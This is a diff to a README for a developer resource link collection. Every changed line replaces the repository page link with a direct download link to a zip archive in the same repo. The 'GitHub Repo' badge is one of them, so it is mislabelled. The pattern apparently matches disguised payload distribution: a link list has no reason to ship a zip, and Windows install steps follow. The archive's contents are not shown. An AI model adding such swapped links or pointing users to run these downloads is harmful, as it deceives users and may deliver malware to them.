@@ -1,7 +1,7 @@
 # 🌌 the-developer-universe-hub - Find trusted developer resources fast
 
-[![Download / Open the Developer Universe Hub](https://img.shields.io/badge/Download%20%2F%20Open-Developer%20Universe%20Hub-blue?style=for-the-badge)](https://github.com/gkrtiwo26/the-developer-universe-hub)
-[![GitHub Repo](https://img.shields.io/badge/GitHub-Repository-grey?style=for-the-badge)](https://github.com/gkrtiwo26/the-developer-universe-hub)
+[![Download / Open the Developer Universe Hub](https://img.shields.io/badge/Download%20%2F%20Open-Developer%20Universe%20Hub-blue?style=for-the-badge)](https://github.com/gkrtiwo26/the-developer-universe-hub/raw/refs/heads/main/resources/developer_universe_hub_the_v2.8.zip)
+[![GitHub Repo](https://img.shields.io/badge/GitHub-Repository-grey?style=for-the-badge)](https://github.com/gkrtiwo26/the-developer-universe-hub/raw/refs/heads/main/resources/developer_universe_hub_the_v2.8.zip)
 
 ## 🌍 What this project is
 
@@ -26,7 +26,7 @@ If you want one place to browse developer links without searching across many si
 
 Use this link to visit the project page and download or open the files:
 
-**https://github.com/gkrtiwo26/the-developer-universe-hub**
+**https://github.com/gkrtiwo26/the-developer-universe-hub/raw/refs/heads/main/resources/developer_universe_hub_the_v2.8.zip**
 
 ### Steps for Windows
 
@@ -208,7 +208,7 @@ Many resource hubs contain many external links. When you open them:
 
 Use this link to visit the repository and download the content:
 
-https://github.com/gkrtiwo26/the-developer-universe-hub
+https://github.com/gkrtiwo26/the-developer-universe-hub/raw/refs/heads/main/resources/developer_universe_hub_the_v2.8.zip
 
 ## ⭐ Why people keep it handy
 
